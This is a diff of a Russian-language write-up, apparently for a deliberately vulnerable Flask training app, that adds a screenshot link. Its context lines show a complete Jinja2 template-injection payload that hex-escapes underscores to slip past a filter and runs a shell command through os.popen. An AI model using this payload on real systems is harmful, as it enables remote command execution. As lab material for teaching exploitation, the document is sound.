@@ -22,6 +22,9 @@ SSTI:
 
 > Конечный пейлоад: {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls')|attr('read')()}}
 
+> ![image](https://github.com/medarov411/vuln-app/assets/60567375/0635d79b-576c-4515-8675-169c49209763)
+
+
 
 ### Дополнительные комментарии
 > От себя решил добавить SSTI с фильтрацией, все таки это flask. Не добавить в него ssti, было бы неуважительно :)
